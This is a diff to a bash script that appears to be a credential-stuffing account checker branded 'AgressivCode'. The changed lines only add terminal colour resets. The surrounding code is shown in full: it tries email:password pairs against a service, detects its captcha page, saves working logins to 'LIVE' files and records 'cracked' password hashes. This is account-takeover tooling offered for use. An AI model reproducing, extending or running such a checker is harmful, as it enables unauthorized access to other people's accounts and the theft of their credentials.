@@ -143,13 +143,13 @@ do
               #echo "$get" | grep -Po "<title>(.*?)</title>"
               if echo "$get" | grep -Po "<title>Masukkan Kode Keamanan</title>" >/dev/null
               then
-                 echo "${N}[${O} `date +%x | tr "/" "-"` ${N}]${O} Failed captcha => $email$del$pass ${N}|${O} Checked by AgressivCode"
+                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}]${O} Failed captcha => $email$del$pass ${N}|${O} Checked by AgressivCode"
               else
                  echo "LIVE => $email$del$pass" >> $acc-$list.txt
-                 echo -e "${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked by AgressivCode"
+                 echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked by AgressivCode"
               fi
            else
-              echo -e "${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => $email$del$pass ${N}|${R} Checked by AgressivCode"
+              echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => $email$del$pass ${N}|${R} Checked by AgressivCode"
               echo "bad" >> .0-$list
            fi
         else
@@ -157,18 +157,18 @@ do
            then  
                 if [[ "$hash" = "y" ]];then
                    echo "${pass}" >> .0-$list
-                   echo -e "${R}[?] Not Cracked: $email$del${pass}"
+                   echo -e "\x1b[0m${R}[?] Not Cracked: $email$del${pass}"
                 else   
-                   echo -e "${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => ${R}$email$del$pass ${N}|${R} Checked by AgressivCode"
+                   echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${R}DIE => ${R}$email$del$pass ${N}|${R} Checked by AgressivCode"
                    echo "DIE => $email$del$pass" >> .0-$list
                 fi
            else
                 if [[ "$hash" = "y" ]];then
                     echo "$email$del$get" >> cracked-$list
-                    echo -e "${G}[!] Cracked: $email$del$get"
+                    echo -e "\x1b[0m${G}[!] Cracked: $email$del$get"
                 else
                    echo "LIVE => $email$del$pass" >> $acc-$list
-                   echo -e "${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked by AgressivCode"
+                   echo -e "\x1b[0m${N}[${O} `date +%x | tr "/" "-"` ${N}] ${G}LIVE => $email$del$pass ${N}|${G} Acc $asu ${N}|${G} Checked by AgressivCode"
                 fi
            fi
         fi
